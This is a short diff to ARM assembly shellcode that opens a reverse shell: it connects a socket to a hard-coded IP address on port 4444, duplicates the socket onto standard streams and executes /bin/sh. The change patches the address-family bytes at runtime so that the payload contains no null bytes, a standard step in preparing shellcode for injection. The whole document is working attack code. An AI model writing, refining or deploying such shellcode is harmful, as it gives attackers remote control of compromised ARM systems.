@@ -22,7 +22,7 @@ _start:
 	mov r4, r0;			// maintain our socket address needed for the dup2 functions later on
 	adr r1, address;		// ptr to our ip and port address below
 //	add r1, pc, #44;		// alternate way to store ptr to socket params below
-	mov r6, r6;
+	strb r2, [r1, #1];		// patch AFNET family in .address below with null byte
 	mov r2, #16;
 	movw r7, #283;
 	svc #1;				// call connect(3, "192.168.200.1", 16)
@@ -47,10 +47,10 @@ _start:
 	eor r1, r1;
 	eor r2, r2;
 	mov r7, #11; 
-	svc #1;		//call execve("/bin/sh")
+	svc #1;				//call execve("/bin/sh")
 
 address:
-	.ascii "\x02\x00"		//
+	.ascii "\x02\xFF"		
 	.ascii "\x11\x5c"		// port 4444
 	.byte 172,16,1,1		//target IP
 
